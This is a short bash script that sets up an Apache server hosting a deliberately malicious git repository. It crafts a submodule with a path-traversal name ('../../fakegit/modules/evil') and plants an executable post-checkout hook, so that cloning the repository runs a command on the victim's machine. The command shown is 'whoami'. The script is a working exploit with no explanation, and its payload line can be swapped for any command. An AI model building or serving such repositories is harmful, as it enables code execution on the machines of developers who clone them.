#!/bin/bash
sudo apt update
sudo apt install -y apache2

mkdir exploit.git && cd exploit.git && git init . --bare && cd ..
git clone exploit.git && cd exploit
mkdir -p fakegit/modules/
git submodule add https://github.com/RyouYoo/em.git evil
git submodule add https://github.com/RyouYoo/em.git aaa
mv .git/modules/evil fakegit/modules/evil
echo -e "#!/bin/sh\nwhoami" > fakegit/modules/evil/hooks/post-checkout
chmod 755 fakegit/modules/evil/hooks/post-checkout
git config -f .gitmodules --rename-section submodule.evil submodule.../../fakegit/modules/evil
sed -i 's/\.git/fakegit/' evil/.git

git add .
git commit -m "lol"
git push
cd ../
mv exploit.git /var/www/html
mv exploit /var/www/html
cd /var/www/html/exploit.git
git update-server-info
echo "Malicious repo is ready at: /var/www/html/exploit.git"
